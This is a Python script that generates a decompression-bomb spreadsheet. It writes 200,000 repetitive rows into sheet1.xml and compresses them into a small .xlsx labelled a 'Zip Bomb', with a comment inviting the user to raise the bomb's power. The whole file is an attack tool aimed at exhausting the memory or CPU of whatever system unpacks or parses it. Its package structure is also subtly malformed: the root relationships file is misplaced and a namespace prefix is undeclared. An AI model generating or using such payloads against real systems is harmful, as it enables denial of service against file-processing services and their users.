# -*- coding: utf-8 -*-
# @Author: maoyongfan
# @email: maoyongfan@163.com
# @Date: 2025/7/8 09:48

import os
import zipfile


# 构造大型 sheet1.xml 内容（高度重复的数据）
def generate_large_sheet_xml(repeat_row=100000):
    row_template = '''<row r="{row}" spans="1:1"><c r="A{row}" t="inlineStr"><is><t>{value}</t></is></c></row>\n'''
    rows = []
    for i in range(1, repeat_row + 1):
        rows.append(row_template.format(row=i, value='爆炸' * 10))

    xml_content = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<sheetData>
{}
</sheetData>
</worksheet>'''.format(''.join(rows))

    return xml_content


# 创建 xlsx（本质是zip格式）
def create_zip_bomb_xlsx(output_file="/Users/maoyongfan/Downloads/xlsx_bomb.xlsx", repeat_row=100000):
    # 制作临时结构
    os.makedirs("temp/xl/worksheets", exist_ok=True)
    os.makedirs("temp/_rels", exist_ok=True)
    os.makedirs("temp/xl/_rels", exist_ok=True)

    # 创建核心 XML 文件
    with open("temp/xl/worksheets/sheet1.xml", "w", encoding="utf-8") as f:
        f.write(generate_large_sheet_xml(repeat_row=repeat_row))

    # 生成其他必要结构（最简可打开结构）
    with open("temp/[Content_Types].xml", "w") as f:
        f.write(r'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>''')

    with open("temp/.rels", "w") as f:
        f.write(r'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
</Relationships>''')

    with open("temp/xl/workbook.xml", "w") as f:
        f.write(r'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheets>
    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
  </sheets>
</workbook>''')

    with open("temp/xl/_rels/workbook.xml.rels", "w") as f:
        f.write(r'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
</Relationships>''')

    # 打包为 .xlsx（zip 文件）
    with zipfile.ZipFile(output_file, 'w', compression=zipfile.ZIP_DEFLATED) as z:
        for folder, _, files in os.walk("temp"):
            for file in files:
                path = os.path.join(folder, file)
                arcname = os.path.relpath(path, "temp")
                z.write(path, arcname)

    print(f"[+] Zip Bomb xlsx 生成完成: {output_file}")


# 调用
if __name__ == "__main__":
    create_zip_bomb_xlsx(repeat_row=200000)  # 修改此参数调节炸弹威力